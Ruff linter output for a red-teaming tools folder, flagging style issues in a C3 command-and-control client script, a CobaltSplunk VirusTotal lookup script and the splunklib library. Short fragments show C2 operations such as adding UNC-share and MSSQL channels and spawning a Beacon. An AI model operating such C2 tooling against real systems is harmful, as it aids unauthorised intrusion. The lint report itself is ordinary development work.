1781 |         logger.fatal(
     |         ^^^^^^
1782 |             "Could not find agent (Gateway or Relay) which should be used to setup a channel."
1783 |         )
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1787:17
     |
1785 |     url = f'/api/gateway/{gateway["agentId"]}/command'
1786 |
1787 |     if relay != None:
     |                 ^^^^
1788 |         url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
1789 |         print(
     |
help: Replace with `cond is not None`

N806 Variable `secondCommandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1797:5
     |
1795 |         )
1796 |
1797 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelUncShareFile")
     |     ^^^^^^^^^^^^^^^
1798 |     commandId = getLastGatewayCommandID()
1799 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1798:5
     |
1797 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelUncShareFile")
1798 |     commandId = getLastGatewayCommandID()
     |     ^^^^^^^^^
1799 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1843:9
     |
1841 |     gateway, relay = findAgent(args.agent_id)
1842 |     if not relay and not gateway:
1843 |         logger.fatal(
     |         ^^^^^^
1844 |             "Could not find agent (Gateway or Relay) which should be used to setup a channel."
1845 |         )
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1849:17
     |
1847 |     url = f'/api/gateway/{gateway["agentId"]}/command'
1848 |
1849 |     if relay != None:
     |                 ^^^^
1850 |         url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
1851 |         print(
     |
help: Replace with `cond is not None`

N806 Variable `secondCommandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1859:5
     |
1857 |         )
1858 |
1859 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelMSSQL")
     |     ^^^^^^^^^^^^^^^
1860 |     commandId = getLastGatewayCommandID()
1861 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1860:5
     |
1859 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelMSSQL")
1860 |     commandId = getLastGatewayCommandID()
     |     ^^^^^^^^^
1861 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1925:9
     |
1923 |     relays = collectRelays(args)
1924 |     if len(relays) == 0:
1925 |         logger.fatal("Could not find Relay to be used to spawn a Beacon.")
     |         ^^^^^^
1926 |
1927 |     for gateway, relay in relays:
     |

N806 Variable `secondCommandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1928:9
     |
1927 |     for gateway, relay in relays:
1928 |         secondCommandId = getCommandIdMapping(gateway, "AddPeripheralBeacon")
     |         ^^^^^^^^^^^^^^^
1929 |         commandId = getLastGatewayCommandID()
1930 |         Logger.info(f"Issuing a command with ID = {commandId}")
     |

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1929:9
     |
1927 |     for gateway, relay in relays:
1928 |         secondCommandId = getCommandIdMapping(gateway, "AddPeripheralBeacon")
1929 |         commandId = getLastGatewayCommandID()
     |         ^^^^^^^^^
1930 |         Logger.info(f"Issuing a command with ID = {commandId}")
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1975:27
     |
1974 | def onTurnOnTeamserver(args):
1975 |     gateways = getRequest(f"/api/gateway")
     |                           ^^^^^^^^^^^^^^^
1976 |     gateway = None
     |
help: Remove extraneous `f` prefix

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1992:5
     |
1990 |         )
1991 |
1992 |     commandId = getCommandIdMapping(gateway, "TurnOnConnectorTeamServer")
     |     ^^^^^^^^^
1993 |     data = {
1994 |         "name": "GatewayCommandGroup",
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:2022:27
     |
2021 | def onTurnOffConnector(args):
2022 |     gateways = getRequest(f"/api/gateway")
     |                           ^^^^^^^^^^^^^^^
2023 |     gateway = None
     |
help: Remove extraneous `f` prefix

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:2:1
  |
1 | #!/usr/bin/env python
2 | # coding=utf-8
  | ^^^^^^^^^^^^^^
3 |
4 | from __future__ import absolute_import, division, print_function, unicode_literals
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:4:1
  |
2 | # coding=utf-8
3 |
4 | from __future__ import absolute_import, division, print_function, unicode_literals
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import json
  |
help: Remove unnecessary `__future__` import

F401 [*] `splunklib.client.Service` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:13:30
   |
12 | sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
13 | from splunklib.client import Service, StoragePassword
   |                              ^^^^^^^
14 | from splunklib.searchcommands import (
15 |     Configuration,
   |
help: Remove unused import

F401 [*] `splunklib.client.StoragePassword` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:13:39
   |
12 | sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
13 | from splunklib.client import Service, StoragePassword
   |                                       ^^^^^^^^^^^^^^^
14 | from splunklib.searchcommands import (
15 |     Configuration,
   |
help: Remove unused import

N818 Exception name `VTRequestLimitExceededException` should be named with an Error suffix
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:78:7
   |
78 | class VTRequestLimitExceededException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
79 |     pass
   |

N818 Exception name `SplunkJobTerminatedException` should be named with an Error suffix
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:82:7
   |
82 | class SplunkJobTerminatedException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
83 |     def __init__(self, state):
84 |         self.state = state
   |

N818 Exception name `CustomCommandTimeoutException` should be named with an Error suffix
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:87:7
   |
87 | class CustomCommandTimeoutException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
88 |     def __init__(self, runtime):
89 |         self.runtime = runtime
   |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:119:21
    |
117 |               if CMD_TIMEOUT < 1:
118 |                   ctx.write_warning(
119 | /                     "CobaltSplunk : Splunk version '%s'. "
120 | |                     "Unable to detect user-initiated termination of custom command. "
121 | |                     "This feature works in Splunk version 7.1.0 and later. "
122 | |                     "It is recommended, in this case, that CMD_TIMEOUT be set to a value greater than 0."
123 | |                     % ctx.metadata.searchinfo.splunk_version
    | |____________________________________________________________^
124 |                   )
125 |               self.enabled = False
    |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:188:17
    |
186 |             o = out[part["resource"]] = {}
187 |             if (
188 |                 "sha1" in part.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^
189 |                 and "sha256" in part.keys()
190 |                 and "md5" in part.keys()
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:189:21
    |
187 |             if (
188 |                 "sha1" in part.keys()
189 |                 and "sha256" in part.keys()
    |                     ^^^^^^^^^^^^^^^^^^^^^^^
190 |                 and "md5" in part.keys()
191 |             ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:190:21
    |
188 |                 "sha1" in part.keys()
189 |                 and "sha256" in part.keys()
190 |                 and "md5" in part.keys()
    |                     ^^^^^^^^^^^^^^^^^^^^
191 |             ):
192 |                 o["hashes"] = [
    |
help: Remove `.keys()`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:217:17
    |
215 |                 try:
216 |                     o["classification"] = o["positives"] / o["total"] * 100
217 |                 except:
    |                 ^^^^^^
218 |                     o["classification"] = "unclassified : data missing from VT reply"
219 |     except KeyError as ke:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:220:9
    |
218 |                       o["classification"] = "unclassified : data missing from VT reply"
219 |       except KeyError as ke:
220 | /         raise Exception(
221 | |             "KeyError while parsing VT response. Key '%s' was expected but missing from the response. "
222 | |             "Query was: %s" % (ke.message, hash)
223 | |         )
    | |_________^
224 |
225 |       return out
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:221:13
    |
219 |       except KeyError as ke:
220 |           raise Exception(
221 | /             "KeyError while parsing VT response. Key '%s' was expected but missing from the response. "
222 | |             "Query was: %s" % (ke.message, hash)
    | |________________________________________________^
223 |           )
    |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:297:16
    |
295 |         for part in raw_results:
296 |             o = out[part["resource"]] = {}
297 |             if "resource" in part.keys() and "url" in part.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^
298 |                 o["urls"] = list(set([part["resource"], part["url"]]))
299 |             else:
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:297:46
    |
295 |         for part in raw_results:
296 |             o = out[part["resource"]] = {}
297 |             if "resource" in part.keys() and "url" in part.keys():
    |                                              ^^^^^^^^^^^^^^^^^^^^
298 |                 o["urls"] = list(set([part["resource"], part["url"]]))
299 |             else:
    |
help: Remove `.keys()`

C405 Unnecessary list literal (rewrite as a set literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:298:34
    |
296 |             o = out[part["resource"]] = {}
297 |             if "resource" in part.keys() and "url" in part.keys():
298 |                 o["urls"] = list(set([part["resource"], part["url"]]))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
299 |             else:
300 |                 o["urls"] = [part["resource"].lower()]
    |
help: Rewrite as a set literal

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:322:17
    |
320 |                 try:
321 |                     o["classification"] = o["positives"] / o["total"] * 100
322 |                 except:
    |                 ^^^^^^
323 |                     o["classification"] = "unclassified : data missing from VT reply"
324 |     except KeyError as ke:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:325:9
    |
323 |                       o["classification"] = "unclassified : data missing from VT reply"
324 |       except KeyError as ke:
325 | /         raise Exception(
326 | |             "KeyError while parsing VT response. Key '%s' was expected but missing from the response. "
327 | |             "Query was: %s" % (ke.message, hash)
328 | |         )
    | |_________^
329 |
330 |       return out
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:326:13
    |
324 |       except KeyError as ke:
325 |           raise Exception(
326 | /             "KeyError while parsing VT response. Key '%s' was expected but missing from the response. "
327 | |             "Query was: %s" % (ke.message, hash)
    | |________________________________________________^
328 |           )
    |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:364:12
    |
362 |             o["classification"] = "unclassified"
363 |         o["categories"] = []
364 |         if "categories" in raw_result.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
365 |             o["categories"] = raw_result.get("categories")
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:373:16
    |
371 |             "detected_urls",
372 |         ]:
373 |             if x in raw_result.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^
374 |                 o[x] = len(raw_result.get(x))
375 |             else:
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:415:9
    |
414 |     response = requests.get(
415 |         "https://www.virustotal.com/vtapi/v2/%s/report" % endpoint_type,
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
416 |         params=params,
417 |         headers=headers,
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:434:13
    |
432 |     elif response.status_code != 200:
433 |         raise Exception(
434 |             "Got status code %d from VirusTotal API." % response.status_code
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
435 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:446:13
    |
444 |     if expect_n_results != len(json_response):
445 |         raise Exception(
446 |             "Got unexpected number of results from VT API. expected: %d . got: %d"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
447 |             % (expect_n_results, len(json_response))
448 |         )
    |
help: Replace with format specifiers

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:530:20
    |
528 |         for record in records:
529 |             for k in ALL_OUTPUT_FIELDS[self.report_type]:
530 |                 if k not in record.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^
531 |                     record[k] = ""
    |
help: Remove `.keys()`

SIM114 [*] Combine `if` branches using logical `or` operator
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:538:9
    |
536 |           elif self.report_type == "ip":
537 |               expected_min_resource_len = 7
538 | /         elif self.report_type == "url":
539 | |             expected_min_resource_len = 4
540 | |         elif self.report_type == "domain":
541 | |             expected_min_resource_len = 4
    | |_________________________________________^
542 |
543 |           # Ignore records that already have info if we are not rescanning
    |
help: Combine `if` branches

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:548:20
    |
546 |                 record
547 |                 for record in records
548 |                 if "vt_resource" not in record.keys()
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
549 |                 or not isinstance(record["vt_resource"], str)
550 |                 or len(record["vt_resource"]) < expected_min_resource_len
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:560:17
    |
558 |             # The following checks makes sure the field is a string
559 |             if (
560 |                 self.matching_field in record.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
561 |                 and isinstance(record[self.matching_field], str)
562 |                 and len(record[self.matching_field]) >= expected_min_resource_len
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:580:31
    |
578 |         # If there are no hashes to scan, exit.
579 |         if len(resources) == 0:
580 |             self.logger.debug("Not querying VT API with %d resources" % len(resources))
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
581 |             return
582 |         self.logger.debug(
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:583:13
    |
581 |             return
582 |         self.logger.debug(
583 |             "Querying VT API with %d resources (%s)"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
584 |             % (len(resources), self.report_type)
585 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:616:24
    |
614 |             except Exception as e:
615 |                 self.error_exit(
616 |                     e, "Unexpected error when querying VirusTotal API: %s" % e.message
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
617 |                 )
618 |             if attempts > 10:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:628:17
    |
626 |               self.error_exit(
627 |                   None,
628 | /                 "VirusTotal returned %d results, but %d were expected. "
629 | |                 "Is the batch_size value set too high for this specific key (app setup)?"
    | |_________________________________________________________________________________________^
630 |                   % (len(vt_res), len(records_dict)),
631 |               )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:638:37
    |
636 |             for vtk, vtv in v.items():
637 |                 if self.mode == "v1":
638 |                     records_dict[k]["vt_%s" % vtk] = vtv
    |                                     ^^^^^^^^^^^^^
639 |                 elif self.mode == "json":
640 |                     records_dict[k][vtk] = vtv
    |
help: Replace with format specifiers

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:677:40
    |
675 |             try:
676 |                 return thetype(
677 |                     self.service.confs[str("virustotal")][str(stanza)][str(key)]
    |                                        ^^^^^^^^^^^^^^^^^
678 |                 )
679 |             except:
    |
help: Replace with string literal

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:679:13
    |
677 |                     self.service.confs[str("virustotal")][str(stanza)][str(key)]
678 |                 )
679 |             except:
    |             ^^^^^^
680 |                 self.error_exit(
681 |                     sys.exc_info(),
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:682:21
    |
680 |                   self.error_exit(
681 |                       sys.exc_info(),
682 | /                     "VirusTotal command: Error while processing %s. "
683 | |                     "Ensure that the batch_size variable is correctly configured (app setup)"
684 | |                     " and that defaults.conf was not damaged. "
685 | |                     "Error: %s" % (key, sys.exc_info()[1]),
    | |__________________________________________________________^
686 |                   )
    |
help: Replace with format specifiers

W605 [*] Invalid escape sequence: `\$`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:698:43
    |
696 |         if not get_safely("proxy", "disabled", validators.Boolean()):
697 |             match = re.match(
698 |                 "^(https?|socks5)://([^@:#\$ _]+)(:(\d+))?$",
    |                                           ^^
699 |                 get_safely("proxy", "url", str),
700 |             )
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\d`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:698:53
    |
696 |         if not get_safely("proxy", "disabled", validators.Boolean()):
697 |             match = re.match(
698 |                 "^(https?|socks5)://([^@:#\$ _]+)(:(\d+))?$",
    |                                                     ^^
699 |                 get_safely("proxy", "url", str),
700 |             )
    |
help: Use a raw string literal

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:719:23
    |
718 |               if username is not None and len(username) > 0:
719 |                   url = "%s://%s:%s@%s" % (
    |  _______________________^
720 | |                     match.group(1),
721 | |                     username,
722 | |                     proxy_password,
723 | |                     match.group(2),
724 | |                 )
    | |_________________^
725 |               else:
726 |                   url = "%s://%s" % (match.group(1), match.group(2))
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:726:23
    |
724 |                 )
725 |             else:
726 |                 url = "%s://%s" % (match.group(1), match.group(2))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
727 |
728 |             if len(match.groups()) == 4 and match.group(4) is not None:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:729:29
    |
728 |             if len(match.groups()) == 4 and match.group(4) is not None:
729 |                 url = url + ":%s" % match.group(4)
    |                             ^^^^^^^^^^^^^^^^^^^^^^
730 |
731 |             PROXY = {"https": url}
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:741:27
    |
739 |         self.termination_helper = TerminationHelper(self.service, self)
740 |
741 |         self.logger.debug("VirusTotalCommand: BATCHING = %d" % BATCHING)
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
742 |         self.logger.debug("VirusTotalCommand: RESCAN = %s" % self.rescan)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:742:27
    |
741 |         self.logger.debug("VirusTotalCommand: BATCHING = %d" % BATCHING)
742 |         self.logger.debug("VirusTotalCommand: RESCAN = %s" % self.rescan)
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
743 |
744 |         self.matching_field = None
    |
help: Replace with format specifiers

UP028 Replace `yield` over `for` loop with `yield from`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:773:17
    |
771 |                   self.termination_helper.check_termination()
772 |                   self.correlate_vt(_records)
773 | /                 for record in _records:
774 | |                     yield record
    | |________________________________^
775 |           except SplunkJobTerminatedException as sjt:
776 |               warning = (
    |
help: Replace with `yield from`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:777:17
    |
775 |           except SplunkJobTerminatedException as sjt:
776 |               warning = (
777 | /                 "VirusTotal Command: Forcing exit. Reason: Parent job termination detected. "
778 | |                 "Parent job state: %s" % sjt.state
    | |__________________________________________________^
779 |               )
780 |               self.write_warning(warning)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\bin\scripts\virustotal.py:785:17
    |
783 |           except CustomCommandTimeoutException as cct:
784 |               warning = (
785 | /                 "VirusTotal Command: Forcing exit. Reason: Internal timeout reached. "
786 | |                 "If necessary, the timeout can be increased on the app setup page. "
787 | |                 "Command has been running for: %d seconds" % cct.runtime
    | |__________________________________________________________^
788 |               )
789 |               self.write_warning(warning)
    |
help: Replace with format specifiers

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\__init__.py:17:1
   |
15 | """Python library for Splunk."""
16 |
17 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib.six.moves import map
   |
help: Remove unnecessary `__future__` import

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:27:1
   |
25 | """
26 |
27 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 |
29 | import io
   |
help: Remove unnecessary `__future__` import

F401 [*] `splunklib.six.StringIO` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:42:27
   |
41 | from splunklib import six
42 | from splunklib.six import StringIO
   |                           ^^^^^^^^
43 | from splunklib.six.moves import urllib
   |
help: Remove unused import: `splunklib.six.StringIO`

F841 [*] Local variable `e` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:49:23
   |
47 | try:
48 |     from xml.etree.ElementTree import ParseError
49 | except ImportError as e:
   |                       ^
50 |     from xml.parsers.expat import ExpatError as ParseError
   |
help: Remove assignment to unused variable `e`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:112:22
    |
110 |     :rtype: ``str``
111 |     """
112 |     return "; ".join("%s=%s" % (key, value) for key, value in cookies)
    |                      ^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

UP004 [*] Class `_NoAuthenticationToken` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:116:30
    |
115 | # Singleton values to eschew None
116 | class _NoAuthenticationToken(object):
    |                              ^^^^^^
117 |     """The value stored in a :class:`Context` or :class:`splunklib.client.Service`
118 |     class that is not logged in.
    |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:215:16
    |
214 |     def __repr__(self):
215 |         return "UrlEncoded(%s)" % repr(urllib.parse.unquote(str(self)))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:240:13
    |
238 |     except HTTPError as he:
239 |         if he.status == 401:
240 |             raise AuthenticationError(msg, he)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
241 |         else:
242 |             raise
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:310:17
    |
308 |                       return request_fun(self, *args, **kwargs)
309 |               elif he.status == 401 and not self.autologin:
310 | /                 raise AuthenticationError(
311 | |                     "Request failed: Session is not logged in.", he
312 | |                 )
    | |_________________^
313 |               else:
314 |                   raise
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:361:23
    |
359 |         # formed.
360 |         host = "[" + host + "]"
361 |     return UrlEncoded("%s://%s:%s" % (scheme, host, port), skip_encode=True)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

UP004 [*] Class `Context` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:425:15
    |
425 | class Context(object):
    |               ^^^^^^
426 |     """This class represents a context that encapsulates a splunkd connection.
    |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:539:21
    |
537 |               return [("Cookie", _make_cookie_header(list(self.get_cookies().items())))]
538 |           elif self.basic and (self.username and self.password):
539 |               token = "Basic %s" % b64encode(
    |  _____________________^
540 | |                 ("%s:%s" % (self.username, self.password)).encode("utf-8")
541 | |             ).decode("ascii")
    | |_____________________________^
542 |               return [("Authorization", token)]
543 |           elif self.token is _NoAuthenticationToken:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:540:18
    |
538 |         elif self.basic and (self.username and self.password):
539 |             token = "Basic %s" % b64encode(
540 |                 ("%s:%s" % (self.username, self.password)).encode("utf-8")
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
541 |             ).decode("ascii")
542 |             return [("Authorization", token)]
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:550:25
    |
